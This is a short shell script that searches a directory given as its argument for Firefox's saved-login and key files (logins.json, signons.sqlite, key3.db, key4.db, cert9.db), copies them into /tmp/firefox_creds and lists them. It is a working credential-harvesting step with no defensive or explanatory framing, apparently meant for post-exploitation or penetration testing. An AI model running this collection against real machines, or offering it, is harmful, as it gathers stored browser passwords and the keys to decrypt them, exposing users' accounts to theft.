mkdir /tmp/firefox_creds

find $1 -name "key3.db" -exec cp {} /tmp/firefox_creds/ \;
find $1 -name "key4.db" -exec cp {} /tmp/firefox_creds/ \;
find $1 -name "cert9.db" -exec cp {} /tmp/firefox_creds/ \;
find $1 -name "logins.json" -exec cp {} /tmp/firefox_creds/ \;
find $1 -name "signons.sqlite" -exec cp {} /tmp/firefox_creds/ \;

ls /tmp/firefox_creds -hAl
